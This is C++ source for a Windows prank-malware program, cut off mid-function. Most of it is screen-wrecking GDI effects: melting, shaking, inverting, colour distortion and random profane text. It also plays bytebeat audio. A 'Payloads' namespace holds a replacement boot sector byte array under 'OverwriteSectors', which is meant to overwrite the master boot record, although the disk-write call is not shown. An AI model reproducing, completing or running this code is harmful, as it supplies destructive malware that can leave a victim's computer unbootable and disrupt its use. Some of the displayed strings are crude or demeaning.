#include <windows.h>
#include <vector>
#include <random>
#include <thread>
#include <chrono>
#include <time.h>
#include <cmath>
#include <math.h>
#include <mmsystem.h>

#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "winmm.lib")

bool running = true;
bool second = true;
bool third = true;
bool fourth = true;
bool five = true;
bool six = true;
bool seven = true;
bool eight = true;
bool nine = true;
bool ten = true;

HDC dc = GetDC(NULL);
HDC dcCopy = CreateCompatibleDC(dc);
int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

static ULONGLONG n, r;
int randy() {
    return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff;
}

int colorsdelay = 50;

VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}

typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT v;
} HSV;

typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

namespace Colors
{
    RGBQUAD HSVtoRGB(HSV hsv)
    {
        int hi = (int)floor(hsv.h / 60.0) % 6;
        double f = hsv.h / 60.0 - floor(hsv.h / 60.0);
        double p = hsv.v * (1.0 - hsv.s);
        double q = hsv.v * (1.0 - f * hsv.s);
        double t = hsv.v * (1.0 - (1.0 - f) * hsv.s);

        switch (hi)
        {
        case 0:
            return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255) };
        case 1:
            return { static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255) };
        case 2:
            return { static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255) };
        case 3:
            return { static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255) };
        case 4:
            return { static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255) };
        default:
            return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255) };
        }
    }

    HSV RGBtoHSV(RGBQUAD rgbquad)
    {
        HSV hsv;

        double rd = rgbquad.rgbRed / 255.0;
        double gd = rgbquad.rgbGreen / 255.0;
        double bd = rgbquad.rgbBlue / 255.0;

        double cmax = max(max(rd, gd), bd);
        double cmin = min(min(rd, gd), bd);
        double delta = cmax - cmin;

        hsv.v = cmax;

        if (cmax > 0.0)
            hsv.s = delta / cmax;
        else
            hsv.s = 0.0;

        if (delta > 0.0)
        {
            if (cmax == rd)
                hsv.h = 60.0 * fmod((gd - bd) / delta, 6.0);
            else if (cmax == gd)
                hsv.h = 60.0 * ((bd - rd) / delta + 2.0);
            else if (cmax == bd)
                hsv.h = 60.0 * ((rd - gd) / delta + 4.0);

            if (hsv.h < 0.0)
                hsv.h += 360.0;
        }
        else
        {
            hsv.h = 0.0;
        }

        return hsv;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}

RGBQUAD HSVtoRGB(HSV hsv) {
    double r, g, b;
    int i = (int)floor(hsv.h / 60.0) % 6;
    double f = hsv.h / 60.0 - floor(hsv.h / 60.0);
    double p = hsv.v * (1.0 - hsv.s);
    double q = hsv.v * (1.0 - f * hsv.s);
    double t = hsv.v * (1.0 - (1.0 - f) * hsv.s);
    switch (i) {
    case 0: r = hsv.v, g = t, b = p; break;
    case 1: r = q, g = hsv.v, b = p; break;
    case 2: r = p, g = hsv.v, b = t; break;
    case 3: r = p, g = q, b = hsv.v; break;
    case 4: r = t, g = p, b = hsv.v; break;
    case 5: r = hsv.v, g = p, b = q; break;
    }
    return { (BYTE)(b * 255), (BYTE)(g * 255), (BYTE)(r * 255), 0 };
}

HSV RGBtoHSV(RGBQUAD rgb) {
    double r = rgb.rgbRed / 255.0, g = rgb.rgbGreen / 255.0, b = rgb.rgbBlue / 255.0;
    double maxC = max(r, max(g, b)), minC = min(r, min(g, b));
    double delta = maxC - minC;
    HSV hsv = { 0, 0, maxC };
    if (delta > 0) {
        if (maxC == r) hsv.h = fmod((g - b) / delta, 6.0);
        else if (maxC == g) hsv.h = (b - r) / delta + 2.0;
        else hsv.h = (r - g) / delta + 4.0;
        hsv.h *= 60.0; if (hsv.h < 0) hsv.h += 360.0;
        hsv.s = delta / maxC;
    }
    return hsv;
}

namespace Payloads 
{
    VOID OverwriteSectors(VOID)
    {
        //SECTOR BINARIES
        const BYTE BOOTSECTOR[3072] =
        {
            0xEB, 0x00, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xC0, 0x8E, 0xD8,
            0x31, 0xFF, 0x8B, 0x2E, 0x97, 0x7C, 0xB9, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x89, 0xD0, 0x2D, 0xA0,
            0x00, 0x89, 0xCE, 0x83, 0xEE, 0x64, 0x01, 0xE8, 0x31, 0xF0, 0x24, 0x1F, 0x89, 0xC3, 0x89, 0xF0,
            0x01, 0xE8, 0xC1, 0xF8, 0x02, 0x83, 0xE0, 0x1F, 0x05, 0xA0, 0x00, 0x29, 0xD0, 0x83, 0xF8, 0x04,
            0x7F, 0x07, 0x83, 0xF8, 0xFC, 0x7C, 0x02, 0xB3, 0x0F, 0x88, 0xD8, 0xAA, 0x42, 0x81, 0xFA, 0x40,
            0xCD, 0x10, 0xBE, 0x9A, 0x7C, 0x8A, 0x1E, 0x99, 0x7C, 0x8A, 0x04, 0x84, 0xC0, 0x74, 0x10, 0xB4,
            0x0E, 0xCD, 0x10, 0x46, 0xFE, 0xC3, 0x80, 0xFB, 0x38, 0x75, 0x02, 0xB3, 0x20, 0xEB, 0xEA, 0x83,
            0x06, 0x97, 0x7C, 0x02, 0xFE, 0x06, 0x99, 0x7C, 0x80, 0x3E, 0x99, 0x7C, 0x38, 0x75, 0x05, 0xC6,
            0x06, 0x99, 0x7C, 0x20, 0xE9, 0x79, 0xFF, 0x00, 0x00, 0x20, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

        };
    }
}

static DWORD WINAPI JPEG(LPVOID lpParam) {
    while (1) {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 8;
        int hs = h / 8;

        BLENDFUNCTION blur = { 0 };
        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        //SET OUT BLUR
        blur.BlendOp = AC_SRC_OVER;
        blur.BlendFlags = 0;
        blur.AlphaFormat = 0;
        blur.SourceConstantAlpha = 20;

        INT i = 0;

        while (running)
        {
            StretchBlt(dcCopy, rand() % 1, rand() % 1, ws, hs, dc, rand() % -1, rand() % -1, w, h, SRCCOPY);

            for (int x = 0; x < ws; x++)
            {
                for (int y = 0; y < hs; y++)
                {
                    int index = y * ws + x;

                    rgbquad[index].rgbRed += i;
                    rgbquad[index].rgbGreen += i;
                    rgbquad[index].rgbBlue += i;
                }
            }

            i++;

            Sleep(rand() % 500);
            AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, blur);

            if (!second) break;
        }

        return 0x00;
    }
}

DWORD WINAPI BYTEBEATS(LPVOID lpvd) {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    const int bufferSize = 17000 * 60;
    BYTE* sbuffer = new BYTE[bufferSize];
    DWORD t = 0;

    while (true) {
        for (int i = 0; i < bufferSize; i++, t++) {
            sbuffer[i] = (BYTE)(t * ((t >> 12 | t >> 8) & 63 & t >> 4));
        }
        WAVEHDR header = { (LPSTR)sbuffer, (DWORD)bufferSize, 0, 0, 0, 0, 0, 0 };
        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
        Sleep(30000);
        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    }
    return 0;
}

static DWORD WINAPI COLORS(LPVOID lpParam) {
    HDC dc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(dc);

    int ws = w / 1;
    int hs = h / 1;

    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = ws;
    bmpi.bmiHeader.biHeight = hs;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;

    bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(dcCopy, bmp);

    INT i = 0;

    SetStretchBltMode(dc, COLORONCOLOR);
    SetStretchBltMode(dcCopy, COLORONCOLOR);

    while (running)
    {
        StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

        int color = rand() % 360;

        for (int x = 0; x < ws; x++)
        {
            for (int y = 0; y < hs; y++)
            {
                int index = y * ws + x;

                HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

                hsv.h = fmod(color, 360.0);

                rgbquad[index] = Colors::HSVtoRGB(hsv);
            }
        }

        i++;

        Sleep(rand() % 1000);

        StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
        StretchBlt(dc, 0, 0, w, h, dc, 0, 0, w, h, PATINVERT);

        Sleep(colorsdelay);

        if (!running) break;
    }

    return 0x00;
}

static DWORD WINAPI RGBEFFECT(LPVOID lpParam) {
    while (second) {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, bm);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        POINT pt[3];
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, rand() % 2, rand() % 2, sw, sh, hdcMem, rand() % 2, rand() % 2, 0x123456);
        DeleteObject(brush);
        DeleteObject(hdcMem); DeleteObject(bm);
        ReleaseDC(0, hdc);
        Sleep(1);
    }

    return 0x00;
}

static DWORD WINAPI WAVIA(LPVOID lpParam) {
    while (running) {
        HDC desk = GetDC(0);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        int t = (rand() % sh);
        int x = (rand() % 5);
        if (x == 0) StretchBlt(desk, 2, t, sw + 4, t, desk, 0, t, sw, t, SRCCOPY);
        else if (x == 1) StretchBlt(desk, 0, t, sw, t, desk, 2, t, sw + 4, t, SRCCOPY);
        ReleaseDC(0, desk);
        Sleep(10);
    }
    return 0;
}

static DWORD WINAPI SHAKE(LPVOID lpParam) {
    Sleep(8000);
    while (running) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, rand() % 5, rand() % 6, w, h, hdc, rand() % 5, rand() % 6, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}

static DWORD WINAPI REDGREENBLUE(LPVOID lpParam) {
    while (third) {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, bm);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        POINT pt[3];
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 2, rand() % 255, rand() % 2));
        SelectObject(hdc, brush);
        BitBlt(hdc, rand() % 2, rand() % 2, sw, sh, hdcMem, rand() % 2, rand() % 2, 0x123456);
        DeleteObject(brush);
        DeleteObject(hdcMem); DeleteObject(bm);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
    return 0;
}

static DWORD WINAPI CIRCLES(LPVOID lpParam) {
    while (third) {
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);

        int size = 1000;
        int x = rand() % sw - (size / 2);
        int y = rand() % sh - (size / 2);

        for (int i = 0; i < size && third; i += 100)
        {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(10);
        }

        if (!third) break;
    }
    return 0;
}

static DWORD WINAPI MINICIRCLES(LPVOID lpParam) {
    Sleep(4000);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (fourth) {
        ci(rand() % sw, rand() % sh, 150, 150);
        Sleep(1);
    }
    return 0;
}

static DWORD WINAPI MELT(LPVOID lpParam) {
    HDC hdc;

    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x;
    while (1) {
        hdc = GetDC(0);
        x = rand() % w;
        BitBlt(hdc, x, 5, 80, h, hdc, x, 0, SRCCOPY);
        Sleep(2);
        ReleaseDC(0, hdc); 

        if (!seven) break;
    }

    return 0;
}

static DWORD WINAPI HSVELIPSES(LPVOID lpParam)
{
    HDC dc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(dc);

    int ws = w / 4;
    int hs = h / 4;

    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = ws;
    bmpi.bmiHeader.biHeight = hs;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;

    bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(dcCopy, bmp);

    INT i = 32;

    SetStretchBltMode(dc, COLORONCOLOR);
    SetStretchBltMode(dcCopy, COLORONCOLOR);

    while (1)
    {
        StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

        for (int x = 0; x < ws; x++)
        {
            for (int y = 0; y < hs; y++)
            {
                int index = y * ws + x;

                int cx = x - (ws / 2);
                int cy = y - (hs / 2);

                int zx = (cx * cx);
                int zy = (cy * cy);

                int di = 128.0 + i;

                int fx = di + (di * sin(sqrt(zx + zy) / 32.0));

                HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

                hsv.h = fmod(fx + i, 360.0);

                rgbquad[index] = Colors::HSVtoRGB(hsv);
            }
        }

        i++;

        StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

        Sleep(rand() % 1000);

        if (!five) break;
    }

    return 0x00;
}

static DWORD WINAPI BALLS(LPVOID lpParam)
{
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while (1) {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y;
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }

        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }

        if (y == 0)
        {
            signY = 1;
        }

        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

static DWORD WINAPI BRIGHT(LPVOID lpParam) {
    while (six) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(0);
        BitBlt(hdc, rand() % 2, rand() % 10, w, h, hdc, rand() % 2, rand() % 10, SRCPAINT);
        Sleep(10);
    }

    return 0;
}

static DWORD WINAPI TEXTNINVERT(LPVOID lpParam) {
    HDC dc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(dc);

    LOGFONTW lFont = { 0 };

    lFont.lfWidth = 20;
    lFont.lfHeight = 50;
    lFont.lfOrientation = 400;
    lFont.lfWeight = 800;
    lFont.lfUnderline = TRUE;
    lFont.lfQuality = DRAFT_QUALITY;
    lFont.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN;

    lstrcpy(lFont.lfFaceName, L"Arial Black");

    while (seven)
    {
        if (rand() % 25 == 24)
        {
            LPCSTR lpStrings[] =
            {
                "OH SHIT", "HAIRY CHICKEN", "I WANT TO POOP", "gay", "???", "PIECE OF SHIT",
                "YOUR PIECE OF SHIT", "HMMMM", "POOP", "WHAT THE FUCK", "WTF", "HOLY SHIT",
                "FUCKING SHIT", "AAAAAA", "HAHAHAHA", "U ARE A JOKE", "POOPING!!!!!",
                "A", "AA", "Portogues", "Games", "Salmon pizza", "I LIKE TURTLES", "OH",
                "poop.jpg", "WHAT???", "U ARE?", ":O", "LMAO", "LOL"
            };

            lFont.lfEscapement = rand() % 60;

            HFONT hFont = CreateFontIndirectW(&lFont);
            SelectObject(dc, hFont);

            SetTextColor(dc, RGB(rand() % 0xFF, rand() % 0xFF, rand() % 0xFF));
            SetBkColor(dc, RGB(rand() % 0xA0, rand() % 0xA0, rand() % 0xA0));

            int index = rand() % 40;

            TextOutA(dc, rand() % w, rand() % h, lpStrings[index], lstrlenA(lpStrings[index]));

            if (rand() % 25 == 24)
            {
                if (rand() % 2 == 0)
                {
                    BitBlt(dc, 1, 0, w, h, dc, 0, 1, 0x999999);
                }
                else
                {
                    BitBlt(dc, 1, 0, w, h, dc, 0, 1, 0x666666);
                }
            }

            Sleep(rand() % 5);
        }

        if (!seven) break;
    }

    return 0x00;
}

static DWORD WINAPI INTENSESHAKE(LPVOID lpParam) {
    while (eight) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 12, rand() % 12, w, h, hdc, rand() % 12, rand() % 12, SRCCOPY);
        Sleep(10);
        ReleaseDC(0, hdc);

        if (!eight) break;
    }
    return 0;
}

static DWORD WINAPI INVERT(LPVOID lpParam)
{
    HDC hdc = GetDC(0);
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);

    while (eight)
    {
        hdc = GetDC(0);
        PatBlt(hdc, 0, 0, x, y, PATINVERT);
        Sleep(100);
        ReleaseDC(0, hdc);
    }

    return 0;
}

static DWORD WINAPI COLOROVERDOSE(LPVOID lpParam) {
    Sleep(8000);
    while (eight) {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, bm);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        POINT pt[3];
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 55, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, rand() % 2, rand() % 2, sw, sh, hdcMem, rand() % 2, rand() % 2, 0x123456);
        DeleteObject(brush);
        DeleteObject(hdcMem); DeleteObject(bm);
        ReleaseDC(0, hdc);
        Sleep(1);

        if (!eight) break;
    }
    return 0;
}

static DWORD WINAPI CHAOS(LPVOID lpParam)
{
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;

    bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(dcCopy, bmp);

    INT i = 100;
    INT j = 4;

    while (1)
    {
        SetStretchBltMode(dc, COLORONCOLOR);
        SetStretchBltMode(dcCopy, COLORONCOLOR);

        StretchBlt(dcCopy, rand() % 3, rand() % 3, w / j, h / j, dc, rand() % 3, rand() % 3, w, h, SRCCOPY);

        INT k = rand() % 15;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                if (k < 5)
                {
                    rgbquad[index].rgbRed += rand() % (i + 1);
                    rgbquad[index].rgbGreen += 0;
                    rgbquad[index].rgbBlue += 0;
                }

                if (k >= 5 && k <= 10)
                {
                    rgbquad[index].rgbRed += 0;
                    rgbquad[index].rgbGreen += rand() % (i + 1);
                    rgbquad[index].rgbBlue += 0;
                }

                if (k > 10 && k <= 15)
                {
                    rgbquad[index].rgbRed += 0;
                    rgbquad[index].rgbGreen += 0;
                    rgbquad[index].rgbBlue += rand() % (i + 1);
                }
            }
        }

        i++;

        StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w / j, h / j, SRCCOPY);

        Sleep(rand() % 50);

        if (rand() % 25 == 24)
        {
            StretchBlt(dc, 50, 50, w - 100, h - 100, dc, 0, 0, w, h, SRCCOPY);
            StretchBlt(dc, 50, 50, w - 100, h - 100, dc, 0, 0, w, h, SRCCOPY);
            StretchBlt(dc, 50, 50, w - 100, h - 100, dc, 0, 0, w, h, SRCCOPY);
        }

        if (!nine) break;
    }

    return 0x00;
}

static DWORD WINAPI RANDOMHSVELIPSES(LPVOID lpParam)
{
    HDC dc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(dc);

    int ws = w / 4;
    int hs = h / 4;

    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = ws;
    bmpi.bmiHeader.biHeight = hs;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;

    bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(dcCopy, bmp);

    INT i = 0;

    FLOAT a = 5.0;
    FLOAT b = 3.0;

    SetStretchBltMode(dc, COLORONCOLOR);
    SetStretchBltMode(dcCopy, COLORONCOLOR);

    while (ten)
    {
        StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

        int randx = rand() % ws;
        int randy = rand() % hs;

        for (int x = 0; x < ws; x++)
        {
            for (int y = 0; y < hs; y++)
            {
                int index = y * ws + x;

                int cx = x - randx;
                int cy = y - randy;

                //(x²/a²) + (y²+b²) = 1
                int zx = (cx * cx) / (a * a);
                int zy = (cy * cy) / (b * b);

                int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));

                HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

                hsv.h = fmod(fx + i, 360.0);

                rgbquad[index] = Colors::HSVtoRGB(hsv);
            }
        }

        i++;

        StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

        Sleep(rand() % 1000);
    }

    return 0x00;
}

static DWORD WINAPI PIXELHSVELIPSES(LPVOID lpParam) {
    Sleep(7000);
    while (ten)
    {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);
        int ws = w / 4, hs = h / 4;
        BITMAPINFO bmpi = { sizeof(BITMAPINFOHEADER), ws, hs, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HBITMAP bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);
        for (int i = 0; ; i++) {
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);
            int randx = rand() % ws, randy = rand() % hs;
            for (int x = 0; x < ws; x++) {
                for (int y = 0; y < hs; y++) {
                    int index = y * ws + x;
                    float zx = pow(x - randx, 2) / 25.0; // a=5.0
